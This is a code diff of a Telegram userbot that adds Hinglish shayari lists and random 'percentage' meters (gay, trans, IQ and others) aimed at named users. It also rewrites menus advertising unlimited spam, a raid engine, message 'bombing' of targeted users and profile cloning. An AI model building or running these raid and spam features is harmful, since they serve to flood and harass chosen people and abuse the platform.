+            "✨ *Tum ho meri kahani ka aakhri hissa,*\n📖 *Tum bin adhoora hai yeh kissa.*\n🤝 *Kya tum meri best friend banogi/banoge?*",
+            "🌸 *Phoolon ki tarah tum ho khilte,*\n🌼 *Tum bin dil hai kaise milte?*\n💖 *Best friend ka rishta nibhaoge?*",
+            "💫 *Tum ho meri life ka sundar sapna,*\n🌙 *Tum bin sab hai apna-apna.*\n🧸 *Kya tum best friend banogi/banoge?*",
+            "🌺 *Dosti ki raah mein tumse mila,*\n🌷 *Meri duniya tumse hi saja.*\n💕 *Best friend banoge meri jaan?*",
+            "💝 *Tum ho meri khushiyon ki wajah,*\n🎉 *Tum bin har din hai saza.*\n🤗 *Best friend kya tum banogi/banoge?*",
+            "🌟 *Tum ho meri roshni ka silsila,*\n🌙 *Tum bin sab hai bewajah.*\n💖 *Best friend bano na?*",
+            "🎀 *Tum se hai meri zindagi aasaan,*\n🌸 *Tum bin hai mushkil har armaan.*\n🤝 *Best friend banogi/banoge?*"
+        ]
+
+        MARRIAGE_SHAYARI = [
+            "💍 *Chand sitare sab hai gawah,*\n🌹 *Tum bin jeena hai saza.*\n💕 *Kya tum mujhse shaadi karogi/karoge?*",
+            "💒 *Meri har dua mein tum ho shamil,*\n🌺 *Tum bin har khushi hai mushkil.*\n💞 *Shaadi karoge?*",
+            "🌸 *Pyaar ki raah mein tumse mila,*\n🌹 *Meri jaan ban gaye ho tum.*\n💍 *Shaadi ka vaada karo?*",
+            "💖 *Tum ho meri zindagi ka maqsad,*\n🌟 *Tum bin hai sab kuch bekaar.*\n🤵‍♀️🤵‍♂️ *Shaadi karogi/karoge?*",
+            "🎉 *Har lamha tumhare sang bitana hai,*\n🌙 *Tum bin jeena nahi, marna hai.*\n💏 *Shaadi ka irada hai kya?*",
+            "💕 *Tumse hai pyaar, yeh sach hai,*\n🌹 *Tum bin zindagi kuch nahi.*\n💍 *Shaadi karogi/karoge?*",
+            "🌹 *Tum ho meri subah ki pehli kiran,*\n🌙 *Tum bin meri raat hai viran.*\n💒 *Shaadi karte ho?*",
+            "💗 *Dil ki dhadkan tum hi ho,*\n🌟 *Tum bin sab kuch hai khamosh.*\n💍 *Shaadi ka waqt aa gaya?*",
+            "💖 *Pyaar ki gehraai mein tum ho,*\n🌊 *Tum bin meri manzil hai kho.*\n💏 *Shaadi karogi/karoge?*",
+            "💞 *Tumse hai mera har khwab,*\n🌙 *Tum bin meri zindagi hai azaab.*\n💍 *Shaadi ka irada hai?*"
+        ]
+
+        DIVORCE_SHAYARI = [
+            "💔 *Rishton ki dor hai kamzor,*\n🌪️ *Ab nahi sahega yeh dard-e-dil.*\n❓ *Kya tum talaq chahti ho/chahte ho?*",
+            "😢 *Pyaar tha, par ab hai doori,*\n💔 *Nahi rahi ab koi majboori.*\n📜 *Talaq de do?*",
+            "💔 *Toot gaye sapne saare,*\n🌧️ *Ab nahi rahe hum tumhaare.*\n❓ *Kya talaq chahiye?*",
+            "💔 *Ishq mein thi humko khushi,*\n😣 *Ab toh bas hai tanhai.*\n📄 *Talaq mangte ho?*",
+            "💔 *Vaade tod kar tumne,*\n😤 *Humse hai ab na koi rishta.*\n🗑️ *Talaq do?*",
+            "💔 *Zindagi mein ab nahi ho tum,*\n🌪️ *Mann mein bas gayi hai udaasi.*\n❌ *Talaq ki baat karoge?*",
+            "💔 *Pyaar ki kami hai, saath nahi,*\n😭 *Ab aur nahi yeh dard sahti.*\n📜 *Talaq de do?*",
+            "💔 *Apne the, par ab begane,*\n😤 *Kyun baandhein yeh rishte begaane.*\n❓ *Talaq le lo?*",
+            "💔 *Mann mein ab kuch nahi bas gaye,*\n🍂 *Rishton ke patte jhad gaye.*\n🗑️ *Talaq do?*",
+            "💔 *Tum bin hai jeena mushkil,*\n😣 *Par tum ho toh aur mushkil.*\n📄 *Talaq mangte ho?*"
+        ]
+
+        # ─── DEATHGOD REPLY LIST (unique merge of reply_list and reply_texts) ───
+        deathgod_replies = list(set(reply_list + reply_texts))
+        random.shuffle(deathgod_replies)
 
         # ─── LOAD/SAVE FUNCTIONS ───
         def load_admins():
@@ -1078,11 +1210,11 @@ async def run_user_bot(session_string, chat_id):
                 "║                                                              ║\n"
                 "║  📌 `.menu1` → 👑 Admin, 🔇 Mute & 🧹 Group                ║\n"
                 "║  📌 `.menu2` → ⚔️ Raid Engine                              ║\n"
-                "║  📌 `.menu3` → 💣 Spam & ☠️ DeathGod                       ║\n"
+                "║  📌 `.menu3` → 💣 Spam & 📝 Text Manager & ☠️ Deathgod     ║\n"
                 "║  📌 `.menu4` → 🛡️ Protection, 🖼️ PFP & ❤️ Auto          ║\n"
                 "║  📌 `.menu5` → 🛠️ Tools, 🎵 Music, 🧠 Notes, 🎮 Fun      ║\n"
-                "║  📌 `.menu6` → 🎭 FUN FEATURES (Freeze, Ghost, Bomb...)    ║\n"
-                "║  📌 `.menu7` → 🎭 MORE FUN (Stud, Looks, Gay, Baddie, Sigma)║\n"
+                "║  📌 `.menu6` → 🎭 FUN FEATURES (FULL)                     ║\n"
+                "║  📌 `.menu7` → 🎭 FUN METERS & MORE                        ║\n"
                 "║                                                              ║\n"
                 "║  💡 Use `.cmds` for a complete list.                        ║\n"
                 "║  🔒 Owner‑only commands are marked in `.menu5`.             ║\n"
@@ -1197,15 +1329,8 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_menu3(event, _):
             menu = (
                 "╔══════════════════════════════════════════════════════════════╗\n"
-                "║           💣 𝐒𝐏𝐀𝐌 & 📝 𝐓𝐄𝐗𝐓 𝐌𝐀𝐍𝐀𝐆𝐄𝐑              ║\n"
+                "║           💣 𝐒𝐏𝐀𝐌 & 📝 𝐓𝐄𝐗𝐓 𝐌𝐀𝐍𝐀𝐆𝐄𝐑 & ☠️ 𝐃𝐄𝐀𝐓𝐇𝐆𝐎𝐃      ║\n"
                 "╠══════════════════════════════════════════════════════════════╣\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 ☠️ 𝐃𝐄𝐀𝐓𝐇𝐆𝐎𝐃 𝐑𝐀𝐈𝐃 〕───┐                      ║\n"
-                "║  │  `.deathgod @user <count>` → Start DeathGod raid        ║\n"
-                "║  │  (Merged list of savage replies)                         ║\n"
-                "║  │  `.sdeathgod @user` → Stop DeathGod raid                ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
                 "║  ┌───〔 💣 𝐒𝐏𝐀𝐌 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 〕───┐                    ║\n"
                 "║  │  `.spray <text>` → Unlimited spam                        ║\n"
                 "║  │  `.dspray` → Stop any spray                              ║\n"
@@ -1215,13 +1340,16 @@ async def run_user_bot(session_string, chat_id):
                 "║  │  `.countspray <n> <text>` → Exactly N times              ║\n"
                 "║  │  `.spraydelay <sec>` → Adjust speed (owner only)         ║\n"
                 "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
                 "║  ┌───〔 📝 𝐓𝐄𝐗𝐓 𝐌𝐀𝐍𝐀𝐆𝐄𝐑 (Owner only) 〕───┐         ║\n"
                 "║  │  `.addtext <text>` → Save a text                         ║\n"
                 "║  │  `.listtexts` → Show all saved texts                     ║\n"
                 "║  │  `.edittext <num> <new>` → Edit a text                   ║\n"
                 "║  │  `.deltext <num>` → Delete a text                        ║\n"
                 "║  │  `.cleartext confirm` → Delete all texts                 ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║  ┌───〔 ☠️ 𝐃𝐄𝐀𝐓𝐇𝐆𝐎𝐃 (Spam) 〕───┐                      ║\n"
+                "║  │  `.deathgod <count>` → Spam from Deathgod list           ║\n"
+                "║  │  `.sdeathgod` → Stop Deathgod                            ║\n"
                 "║  └───────────────────────────────┘                          ║\n"
                 "║                                                              ║\n"
                 "║  📌 `.menu` → Main menu                                     ║\n"
@@ -1318,7 +1446,6 @@ async def run_user_bot(session_string, chat_id):
                 "║                                                              ║\n"
                 "║  ┌───〔 🔓 𝐀𝐃𝐌𝐈𝐍-𝐀𝐂𝐂𝐄𝐒𝐒𝐈𝐁𝐋𝐄 〕───┐                ║\n"
                 "║  │  `.nc set <lang> <text>` → Name Changer                  ║\n"
-                "║  │      (hindi/urdu/english/bengali/bihari/emoji)           ║\n"
                 "║  │  `.nc stop` → Stop Name Changer                          ║\n"
                 "║  │  `.copy @user` → Clone user's profile                    ║\n"
                 "║  │  `.normal` → Restore your original profile               ║\n"
@@ -1336,70 +1463,58 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_menu6(event, _):
             menu = (
                 "╔══════════════════════════════════════════════════════════════╗\n"
-                "║              🎭 𝐅𝐔𝐍 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 (𝐅𝐔𝐋𝐋)                ║\n"
+                "║              🎭 FUN FEATURES (FULL)                         ║\n"
                 "╠══════════════════════════════════════════════════════════════╣\n"
+                "║  ┌───〔 FREEZE SYSTEM 〕───┐\n"
+                "║  │  .freeze @user → Freeze user's messages                ║\n"
+                "║  │  .unfreeze @user → Unfreeze user                       ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 GHOST MODE 〕───┐\n"
+                "║  │  .ghost on → Enable ghost mode (invisible)             ║\n"
+                "║  │  .ghost off → Disable ghost mode                       ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 BOMB SYSTEM 〕───┐\n"
+                "║  │  .bomb @user <count> → Bomb user with messages         ║\n"
+                "║  │  .stbomb @user → Stop bombing user                     ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 MINDFUCK MODE 〕───┐\n"
+                "║  │  .mindfuck on → Enable mindfuck mode                   ║\n"
+                "║  │  .mindfuck off → Disable mindfuck                     ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 SILENT KILL 〕───┐\n"
+                "║  │  .silentkill @user → Silently remove user's msgs       ║\n"
+                "║  │  .ssilentkill @user → Stop silent kill                 ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 VOID MODE 〕───┐\n"
+                "║  │  .void @user → Send user to void (hide all msgs)       ║\n"
+                "║  │  .svoid @user → Stop void mode                         ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 CLONE ATTACK 〕───┐\n"
+                "║  │  .clone @user <count> → Clone user's messages          ║\n"
+                "║  │  .sclone @user → Stop clone attack                     ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 DEATHNOTE 〕───┐\n"
+                "║  │  .deathnote @user <msg> → Send death note              ║\n"
+                "║  │  .sdeathnote @user → Stop death note spam              ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 CHAOS MODE 〕───┐\n"
+                "║  │  .chaos on → Enable chaos mode                         ║\n"
+                "║  │  .chaos off → Disable chaos mode                       ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 HACK MODE 〕───┐\n"
+                "║  │  .hack @user → Start hack simulation                   ║\n"
+                "║  │  .shack @user → Stop hack simulation                   ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 VIRUS MODE 〕───┐\n"
+                "║  │  .virus on → Enable virus mode                         ║\n"
+                "║  │  .virus off → Disable virus mode                       ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 BLACKOUT MODE 〕───┐\n"
+                "║  │  .blackout @user → Blackout user's messages            ║\n"
+                "║  │  .sblackout @user → Stop blackout                      ║\n"
+                "║  └───────────────────────────────┘\n"
                 "║                                                              ║\n"
-                "║  ┌───〔 ❄️ 𝐅𝐑𝐄𝐄𝐙𝐄 𝐒𝐘𝐒𝐓𝐄𝐌 〕───┐                    ║\n"
-                "║  │  `.freeze @user` → Freeze user's messages                ║\n"
-                "║  │  `.unfreeze @user` → Unfreeze user                       ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 👻 𝐆𝐇𝐎𝐒𝐓 𝐌𝐎𝐃𝐄 〕───┐                         ║\n"
-                "║  │  `.ghost on` → Enable ghost mode (invisible)             ║\n"
-                "║  │  `.ghost off` → Disable ghost mode                       ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 💣 𝐁𝐎𝐌𝐁 𝐒𝐘𝐒𝐓𝐄𝐌 〕───┐                       ║\n"
-                "║  │  `.bomb @user <count>` → Bomb user with messages         ║\n"
-                "║  │  `.stbomb @user` → Stop bombing user                     ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 🧠 𝐌𝐈𝐍𝐃𝐅𝐔𝐂𝐊 𝐌𝐎𝐃𝐄 〕───┐                    ║\n"
-                "║  │  `.mindfuck on` → Enable mindfuck mode                   ║\n"
-                "║  │  `.mindfuck off` → Disable mindfuck                     ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 🔇 𝐒𝐈𝐋𝐄𝐍𝐓 𝐊𝐈𝐋𝐋 〕───┐                       ║\n"
-                "║  │  `.silentkill @user` → Silently remove user's msgs       ║\n"
-                "║  │  `.ssilentkill @user` → Stop silent kill                 ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 🌌 𝐕𝐎𝐈𝐃 𝐌𝐎𝐃𝐄 〕───┐                          ║\n"
-                "║  │  `.void @user` → Send user to void (hide all msgs)       ║\n"
-                "║  │  `.svoid @user` → Stop void mode                         ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 🎯 𝐂𝐋𝐎𝐍𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 〕───┐                    ║\n"
-                "║  │  `.clone @user <count>` → Clone user's messages          ║\n"
-                "║  │  `.sclone @user` → Stop clone attack                     ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 💀 𝐃𝐄𝐀𝐓𝐇𝐍𝐎𝐓𝐄 〕───┐                         ║\n"
-                "║  │  `.deathnote @user <msg>` → Send death note              ║\n"
-                "║  │  `.sdeathnote @user` → Stop death note spam              ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 🌪️ 𝐂𝐇𝐀𝐎𝐒 𝐌𝐎𝐃𝐄 〕───┐                       ║\n"
-                "║  │  `.chaos on` → Enable chaos mode                         ║\n"
-                "║  │  `.chaos off` → Disable chaos mode                       ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 🖥️ 𝐇𝐀𝐂𝐊 𝐌𝐎𝐃𝐄 〕───┐                         ║\n"
-                "║  │  `.hack @user` → Start hack simulation                   ║\n"
-                "║  │  `.shack @user` → Stop hack simulation                   ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 🦠 𝐕𝐈𝐑𝐔𝐒 𝐌𝐎𝐃𝐄 〕───┐                        ║\n"
-                "║  │  `.virus on` → Enable virus mode                         ║\n"
-                "║  │  `.virus off` → Disable virus mode                       ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 🌑 𝐁𝐋𝐀𝐂𝐊𝐎𝐔𝐓 𝐌𝐎𝐃𝐄 〕───┐                   ║\n"
-                "║  │  `.blackout @user` → Blackout user's messages            ║\n"
-                "║  │  `.sblackout @user` → Stop blackout                      ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  📌 `.menu` → Main menu                                     ║\n"
+                "║  📌 .menu → Main menu                                     ║\n"
                 "║                                                              ║\n"
                 "╚══════════════════════════════════════════════════════════════╝"
             )
@@ -1409,167 +1524,47 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_menu7(event, _):
             menu = (
                 "╔══════════════════════════════════════════════════════════════╗\n"
-                "║        🎭 𝐅𝐔𝐍 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 (𝐏𝐀𝐑𝐓 𝟒 - 𝐅𝐔𝐍 𝐌𝐄𝐓𝐄𝐑)        ║\n"
+                "║            🎭 FUN METERS & MORE                             ║\n"
                 "╠══════════════════════════════════════════════════════════════╣\n"
+                "║  ┌───〔 📊 FUN METERS 〕───┐\n"
+                "║  │  .studmeter @user → Stud %                            ║\n"
+                "║  │  .looks @user → Looks %                               ║\n"
+                "║  │  .gay @user → Gay %                                   ║\n"
+                "║  │  .lesbian @user → Lesbian %                           ║\n"
+                "║  │  .straight @user → Straight %                         ║\n"
+                "║  │  .bi @user → Bi %                                     ║\n"
+                "║  │  .trans @user → Trans %                               ║\n"
+                "║  │  .simp @user → Simp %                                 ║\n"
+                "║  │  .chad @user → Chad %                                 ║\n"
+                "║  │  .friendly @user → Friendly %                         ║\n"
+                "║  │  .rizz @user → Rizz Meter (1-100)                    ║\n"
+                "║  │  .iq @user → IQ Score (1-200)                        ║\n"
+                "║  │  .stupidmeter @user → Stupid %                       ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 💖 BEST FRIEND? 〕───┐\n"
+                "║  │  .bestfrnd @user → Ask with poetic style & buttons    ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 💔 DIVORCE & 💍 MARRIAGE 〕───┐\n"
+                "║  │  .divorce @user → Ask with Yes/No buttons             ║\n"
+                "║  │  .marriage @user → Ask with Yes/No buttons            ║\n"
+                "║  └───────────────────────────────┘\n"
+                "║  ┌───〔 ☠️ DEATHGOD (Spam) 〕───┐\n"
+                "║  │  .deathgod <count> → Spam from Deathgod list          ║\n"
+                "║  │  .sdeathgod → Stop Deathgod                           ║\n"
+                "║  └───────────────────────────────┘\n"
                 "║                                                              ║\n"
-                "║  ┌───〔 📊 𝐒𝐓𝐔𝐃 𝐌𝐄𝐓𝐄𝐑 〕───┐                         ║\n"
-                "║  │  `.studmeter @user` → Show stud percentage              ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 👀 𝐋𝐎𝐎𝐊𝐒 𝐌𝐄𝐓𝐄𝐑 〕───┐                       ║\n"
-                "║  │  `.looks @user` → Show looks percentage                  ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 🏳️‍🌈 𝐆𝐀𝐘 % 〕───┐                              ║\n"
-                "║  │  `.gay @user` → Show gay percentage                      ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 👩‍❤️‍👩 𝐋𝐄𝐒𝐁𝐈𝐀𝐍 % 〕───┐                        ║\n"
-                "║  │  `.lesbian @user` → Show lesbian percentage              ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 👑 𝐁𝐀𝐃𝐃𝐈𝐄 / 𝐏𝐎𝐊𝐊𝐈𝐄 / 𝐒𝐈𝐆𝐌𝐀 〕───┐              ║\n"
-                "║  │  `.baddie @user` → Show Baddie percentage               ║\n"
-                "║  │  `.pokkie @user` → Show Pokkie percentage               ║\n"
-                "║  │  `.sigma @user` → Show Sigma percentage                  ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 💖 𝐁𝐄𝐒𝐓 𝐅𝐑𝐈𝐄𝐍𝐃? 〕───┐                      ║\n"
-                "║  │  `.bestfrnd @user` → Ask in poetic style with buttons    ║\n"
-                "║  │  (only the target user can press the buttons)            ║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  ┌───〔 💔 𝐃𝐈𝐕𝐎𝐑𝐂𝐄 & 💍 𝐌𝐀𝐑𝐑𝐈𝐀𝐆𝐄 〕───┐            ║\n"
-                "║  │  `.divorce @user` → Ask with Yes/No buttons (only target)║\n"
-                "║  │  `.marriage @user` → Ask with Yes/No buttons (only target)║\n"
-                "║  └───────────────────────────────┘                          ║\n"
-                "║                                                              ║\n"
-                "║  📌 `.menu` → Main menu                                     ║\n"
+                "║  📌 .menu → Main menu                                     ║\n"
                 "║                                                              ║\n"
                 "╚══════════════════════════════════════════════════════════════╝"
             )
             await safe_edit(event, menu)
 
-        # ─── BADDIE / POKKIE / SIGMA COMMANDS ───
-        @register_cmd("baddie")
-        async def cmd_baddie(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"👑 **Baddie Meter for {name}**\n\n💅 Baddie Level: {percent}%\n"
-                if percent >= 90:
-                    msg += "🔥 You're a queen/king! 💅✨"
-                elif percent >= 70:
-                    msg += "🌟 Pretty baddie! 😎"
-                elif percent >= 50:
-                    msg += "😏 Average baddie, could be better."
-                else:
-                    msg += "😬 Try harder! 💪"
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("pokkie")
-        async def cmd_pokkie(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"🍭 **Pokkie Meter for {name}**\n\n🍬 Pokkie Level: {percent}%\n"
-                if percent >= 90:
-                    msg += "🍭 Ultimate Pokkie! 😍"
-                elif percent >= 70:
-                    msg += "🍬 Sweet Pokkie! 😊"
-                elif percent >= 50:
-                    msg += "😐 Kinda Pokkie."
-                else:
-                    msg += "😅 Not so Pokkie."
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("sigma")
-        async def cmd_sigma(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"🐺 **Sigma Meter for {name}**\n\n⚡ Sigma Level: {percent}%\n"
-                if percent >= 90:
-                    msg += "🐺 Sigma Male/Female! 💪"
-                elif percent >= 70:
-                    msg += "🌟 Pretty Sigma! 😎"
-                elif percent >= 50:
-                    msg += "😐 Average Sigma."
-                else:
-                    msg += "😅 Need more grind."
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        # ─── DEATHGOD COMMANDS ───
-        @register_cmd("deathgod", needs_reply=True)
-        async def cmd_deathgod(event, arg):
-            """☠️ DeathGod Raid - Reply to user or mention them"""
-            targets = await get_targets(event, arg)
-            if not targets:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            
-            count = None
-            if arg:
-                parts = arg.strip().split()
-                if parts and parts[-1].isdigit():
-                    count = int(parts[-1])
-                    if count < 1: count = 1
-                    if count > 100: count = 100
-            
-            if not deathgod_list:
-                return await safe_edit(event, "❌ DeathGod list is empty!")
-            
-            added = []
-            for uid in targets:
-                user_bot.shayari_raid[uid] = count
-                display = "∞" if count is None else f"{count} times"
-                added.append(f"{uid} ({display})")
-            
-            await safe_edit(event, f"☠️ **DeathGod Raid started** for {', '.join(added)}")
-
-        @register_cmd("sdeathgod")
-        async def cmd_sdeathgod(event, arg):
-            """🛑 Stop DeathGod Raid"""
-            targets = await get_targets(event, arg)
-            if not targets:
-                user_bot.shayari_raid.clear()
-                return await safe_edit(event, "🛑 DeathGod raid stopped for all")
-            removed = []
-            for uid in targets:
-                if uid in user_bot.shayari_raid:
-                    del user_bot.shayari_raid[uid]
-                    removed.append(str(uid))
-            if removed:
-                await safe_edit(event, f"🛑 Removed DeathGod for: {', '.join(removed)}")
-            else:
-                await safe_edit(event, "⚠️ No active DeathGod for these users")
-
-        # ─── FUN COMMANDS ───
+        # ─── FUN METERS ───
         @register_cmd("studmeter")
         async def cmd_studmeter(event, arg):
             target = await get_targets(event, arg)
             if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
+                return
             uid = next(iter(target))
             try:
                 user = await user_bot.get_entity(uid)
@@ -1586,13 +1581,13 @@ async def run_user_bot(session_string, chat_id):
                     msg += "😅 Maybe try some gym? 😂"
                 await safe_edit(event, msg)
             except:
-                await safe_edit(event, "❌ User not found.")
+                pass
 
         @register_cmd("looks")
         async def cmd_looks(event, arg):
             target = await get_targets(event, arg)
             if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
+                return
             uid = next(iter(target))
             try:
                 user = await user_bot.get_entity(uid)
@@ -1609,13 +1604,13 @@ async def run_user_bot(session_string, chat_id):
                     msg += "😬 Maybe try a new style? 😅"
                 await safe_edit(event, msg)
             except:
-                await safe_edit(event, "❌ User not found.")
+                pass
 
         @register_cmd("gay")
         async def cmd_gay(event, arg):
             target = await get_targets(event, arg)
             if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
+                return
             uid = next(iter(target))
             try:
                 user = await user_bot.get_entity(uid)
@@ -1632,13 +1627,13 @@ async def run_user_bot(session_string, chat_id):
                     msg += "💪 Straight as an arrow!"
                 await safe_edit(event, msg)
             except:
-                await safe_edit(event, "❌ User not found.")
+                pass
 
         @register_cmd("lesbian")
         async def cmd_lesbian(event, arg):
             target = await get_targets(event, arg)
             if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
+                return
             uid = next(iter(target))
             try:
                 user = await user_bot.get_entity(uid)
@@ -1655,71 +1650,332 @@ async def run_user_bot(session_string, chat_id):
                     msg += "💁‍♀️ Straight as a ruler!"
                 await safe_edit(event, msg)
             except:
-                await safe_edit(event, "❌ User not found.")
+                pass
 
-        @register_cmd("bestfrnd")
-        async def cmd_bestfrnd(event, arg):
+        @register_cmd("straight")
+        async def cmd_straight(event, arg):
             target = await get_targets(event, arg)
             if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
+                return
             uid = next(iter(target))
             try:
                 user = await user_bot.get_entity(uid)
                 name = user.first_name or str(uid)
-                shayari = f"❤️ *Dil ki baat kehni hai, sun lo meri jaan,*\n🌸 *Tum bin adhoori hai yeh dastaan.*\n💫 *Kya tum banogi/banoge meri best friend?* 🤗"
+                percent = random.randint(0, 100)
+                msg = f"💪 **Straight Percentage for {name}**\n\n📏 Straightness: {percent}%\n"
+                if percent >= 90:
+                    msg += "🏆 Straight as a ruler! 📏"
+                elif percent >= 70:
+                    msg += "😎 Pretty straight! 😏"
+                elif percent >= 50:
+                    msg += "🤷 Could be flexible!"
+                else:
+                    msg += "🌈 Maybe try exploring? 😉"
+                await safe_edit(event, msg)
+            except:
+                pass
+
+        @register_cmd("bi")
+        async def cmd_bi(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
+                msg = f"💜 **Bi Percentage for {name}**\n\n💕 Bisexuality: {percent}%\n"
+                if percent >= 90:
+                    msg += "💜💙 Totally bi! 😍"
+                elif percent >= 70:
+                    msg += "💕 Quite bi-curious! 😏"
+                elif percent >= 50:
+                    msg += "🤷‍♂️ Could go both ways!"
+                else:
+                    msg += "💁 Mostly straight!"
+                await safe_edit(event, msg)
+            except:
+                pass
+
+        @register_cmd("trans")
+        async def cmd_trans(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
+                msg = f"🏳️‍⚧️ **Trans Pride for {name}**\n\n💖 Transness: {percent}%\n"
+                if percent >= 90:
+                    msg += "🌟 You're a beautiful soul! 💕"
+                elif percent >= 70:
+                    msg += "💜 Very strong! 😊"
+                elif percent >= 50:
+                    msg += "🤔 Exploring your identity?"
+                else:
+                    msg += "💁 You're you, that's enough!"
+                await safe_edit(event, msg)
+            except:
+                pass
+
+        @register_cmd("simp")
+        async def cmd_simp(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
+                msg = f"🫠 **Simp Meter for {name}**\n\n😩 Simp Level: {percent}%\n"
+                if percent >= 90:
+                    msg += "💀 Ultimate Simp! 😂"
+                elif percent >= 70:
+                    msg += "💔 Down bad! 😭"
+                elif percent >= 50:
+                    msg += "😅 Slightly simping!"
+                else:
+                    msg += "👑 You're a chad! 😎"
+                await safe_edit(event, msg)
+            except:
+                pass
+
+        @register_cmd("chad")
+        async def cmd_chad(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
+                msg = f"🗿 **Chad Meter for {name}**\n\n💪 Chad Level: {percent}%\n"
+                if percent >= 90:
+                    msg += "🔥 Sigma Chad! 😎"
+                elif percent >= 70:
+                    msg += "💪 Pretty chad! 💪"
+                elif percent >= 50:
+                    msg += "🤷 Neutral vibes!"
+                else:
+                    msg += "🥶 Maybe a bit of a beta? 😉"
+                await safe_edit(event, msg)
+            except:
+                pass
+
+        @register_cmd("friendly")
+        async def cmd_friendly(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
